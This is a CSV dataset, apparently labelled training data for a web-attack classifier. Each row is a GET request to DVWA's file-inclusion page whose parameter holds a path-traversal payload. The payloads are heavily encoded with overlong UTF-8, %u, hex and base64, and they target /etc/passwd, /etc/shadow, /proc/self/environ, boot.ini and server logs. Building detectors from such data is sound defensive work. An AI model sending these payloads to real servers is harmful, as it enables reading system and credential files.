method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=.?À%9v.?À%9v.?À%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%u2216/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f,,6,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..Á\..Á\..Á\..Á\..ÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%c0%af.../.%c0%afetc%c0%afpasswd,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%c0%af??%c0%af??%c0%af??%c0%af??%c0%afetc%c0%afissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..Á..Á..Á..Á..Á..Áboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\..\..\..\/etc/passwd;index.html,,0,4,3,2,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..ø€€€¯etcø€€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/../..//../..//../..///,,6,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯ø€€€®ø€€€®à€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../etc/shadow,,11,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁœ%c0%ae%c0%aeÁœ%c0%ae%c0%aeÁœ%c0%ae%c0%aeÁœboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??À¯??À¯etcÀ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ0x2fÀþÀþ0x2fÀþÀþ0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%uEFC8À^À^%uEFC8À^À^%uEFC8À^À^%uEFC8etc%uEFC8issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\/\..\/\..\/\..\/\etc\/\passwd,,0,4,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eÀ%qfetcÀ%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e\%2%e%2%e\%2%e%2%e\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcÀ.À.Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÀ%9v%uff0e%uff0eÀ%9v%uff0e%uff0eÀ%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..Á¯..Á¯..Á¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5%c..%5%c..%5%cetc%5%cpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%uEFC8\..%uEFC8\..%uEFC8\..%uEFC8\..%uEFC8etc%uEFC8passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../opt/lampp/logs/access_log,,15,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÁœ0x2e0x2eÁœ0x2e0x2eÁœ0x2e0x2eÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^À%qfÀ^À^À%qfÀ^À^À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁœÀþÀþÁœÀþÀþÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fü€€€€®ü€€€€®0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%c0%af%2%e%2%e%c0%af%2%e%2%e%c0%afetc%c0%afissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../logs/access.log,,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ¯%uff0e%uff0eÁ¯%uff0e%uff0eÁ¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÀ/%ÀnÀnÀ/%ÀnÀnÀ/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..0x2f\..0x2f\..0x2f\..0x2f\..0x2f\..0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Á%8sð€€®ð€€®Á%8sð€€®ð€€®Á%8sð€€®ð€€®Á%8sð€€®ð€€®Á%8setcÁ%8spasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..\..\..\..\..\..\boot.ini,,0,6,5,3,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eà€¯0x2e0x2eà€¯0x2e0x2eà€¯etcà€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5c..%5c/etc/passwd,,0,2,1,1,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÀ%qfÀþÀþÀ%qfÀþÀþÀ%qfÀþÀþÀ%qfÀþÀþÀ%qfÀþÀþÀ%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..///..///..///..///windows///system32///drivers///etc///hosts,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..\etc\passwd,,0,1,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®Áœà€®à€®Áœà€®à€®ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ/%c0%ae%c0%aeÀ/%c0%ae%c0%aeÀ/%c0%ae%c0%aeÀ/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\,,0,8,7,4,0,0,0,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Á%8sð€€®ð€€®Á%8setcÁ%8sissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x5c0x2e0x2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/À®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®ÁœÀ®À®Áœ,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%2fð€€®ð€€®%2fð€€®ð€€®%2fð€€®ð€€®%2fetc%2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/www/log/access_log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../,,3,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..../%2%f..../%2%fboot.ini,,2,0,0,0,0,2,0,bad
GET,/vulnerabilities/fi/?page=..À/..À/..À/..À/..À/..À/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®\ð€€®ð€€®\ð€€®ð€€®\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%uEFC8.../.%uEFC8.../.%uEFC8etc%uEFC8issue,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.//..//.//..//.//..//.//..//boot.ini,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../boot.ini,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%e0x2f%2%e%2%e0x2f%2%e%2%e0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%u2216À^À^%u2216À^À^%u2216À^À^%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\{FILE},,0,7,81,3,0,0,0,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%uEFC8%ÀnÀn%uEFC8%ÀnÀn%uEFC8%ÀnÀn%uEFC8etc%uEFC8passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%uEFC8??%uEFC8etc%uEFC8passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../0x5cboot.ini,,1,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,2,1,1,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\\..\\..\\..\\..\\..\\..\\/etc/passwd,,0,7,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??À%9v??À%9v??À%9v??À%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/adm/crash/vmcore,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..Á..Á..ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..Á%pc\..Á%pc\..Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\..\..\..\..\boot.ini,,0,5,4,2,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%uEFC8..../%uEFC8boot.ini,,2,0,0,0,0,2,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%2%f%uff0e%uff0e%2%f%uff0e%uff0e%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=./.././.././.././.././.././.././.././..//etc/passwd,,8,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À/ü€€€€®ü€€€€®À/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/proc/self/fd/6,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯etcÀ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..%uF025\..%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®À/à€®à€®À/à€®à€®À/à€®à€®À/à€®à€®À/à€®à€®À/etcÀ/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Á¯ü€€€€®ü€€€€®Á¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f,,8,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..à€¯\..à€¯windowsà€¯system32à€¯driversà€¯etcà€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%uF025ÀîÀî%uF025ÀîÀî%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþð€€¯ÀþÀþð€€¯ÀþÀþð€€¯ÀþÀþð€€¯ÀþÀþð€€¯ÀþÀþð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5cetc%5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÀ%qfÀîÀîÀ%qfÀîÀîÀ%qfÀîÀîÀ%qfetcÀ%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À%qf..À%qf..À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^0x5cÀ^À^0x5cÀ^À^0x5cÀ^À^0x5cÀ^À^0x5cÀ^À^0x5cetc0x5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÀ\ÀþÀþÀ\ÀþÀþÀ\ÀþÀþÀ\ÀþÀþÀ\ÀþÀþÀ\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.ø€€€¯À.À.ø€€€¯À.À.ø€€€¯À.À.ø€€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®ð€€¯ü€€€€®ü€€€€®ð€€¯ü€€€€®ü€€€€®ð€€¯ü€€€€®ü€€€€®ð€€¯ü€€€€®ü€€€€®ð€€¯ü€€€€®ü€€€€®ð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..\..\..\..\..\..\..\boot.ini,,0,7,6,3,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/apache/logs/access_log,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=..À¯..À¯..À¯..À¯..À¯..À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%2%f..%2%fetc%2%fissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/..%u2215..%u2215{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,,6,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®0x5cø€€€®ø€€€®0x5cetc0x5cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../%uEFC8..../%uEFC8..../%uEFC8etc%uEFC8issue,,3,0,0,0,0,3,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../usr/local/apache/logs/error_log,,15,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcü€€€€®ü€€€€®Á%pcetcÁ%pcpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8setcÁ%8sissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%2%f..../%2%f..../%2%f..../%2%f..../%2%fboot.ini,,5,0,0,0,0,5,0,bad
GET,/vulnerabilities/fi/?page=..../0x2f..../0x2f..../0x2fboot.ini,,3,0,0,0,0,3,1,bad
GET,/vulnerabilities/fi/?page=.?%c0%afetc%c0%afpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..%u2216..%u2216..%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%5%cetc%5%cpasswd,,1,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qfetc%bg%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../proc/self/environ,,13,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÀ¯%uff0e%uff0eÀ¯%uff0e%uff0eÀ¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:\ProgramFiles\ApacheGroup\Apache\logs\access.log,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\../\../\../etc/issue,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^ð€€¯À^À^ð€€¯À^À^ð€€¯À^À^ð€€¯etcð€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®0x5cà€®à€®0x5cà€®à€®0x5cà€®à€®0x5cà€®à€®0x5cà€®à€®0x5cetc0x5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=///../../../windows///system32///drivers///etc///hosts,,3,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^ð€€¯À^À^ð€€¯À^À^ð€€¯À^À^ð€€¯À^À^ð€€¯etcð€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sà€®à€®Á%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%2f?.%2f?.%2fetc%2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^ÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%2f.../.%2fetc%2fpasswd,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/........................................................................../../../../../../../boot.ini,,7,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==,,0,0,0,0,0,0,24,bad
GET,/vulnerabilities/fi/?page=??%uEFC8etc%uEFC8passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%2fetc%2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=//..\{FILE},,0,1,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..././,,1,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=??À¯??À¯??À¯??À¯??À¯??À¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®%c1%9cÀ®À®%c1%9cÀ®À®%c1%9cÀ®À®%c1%9cÀ®À®%c1%9cetc%c1%9cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/exim_mainlog,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,0,7,6,3,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..À\..À\..À\..À\..À\..À\..À\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eà€¯0x2e0x2eà€¯0x2e0x2eà€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.ÁetcÁissue,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%qfð€€®ð€€®À%qfð€€®ð€€®À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts,,0,4,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c%2e%2e%c1%9cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÁ%8sÀîÀîÁ%8sÀîÀîÁ%8sÀîÀîÁ%8sÀîÀîÁ%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%c0%af\..%c0%af\..%c0%afetc%c0%afissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?%u2215.?%u2215etc%u2215passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../boot.ini;index.htm,,3,0,0,0,0,0,1,bad
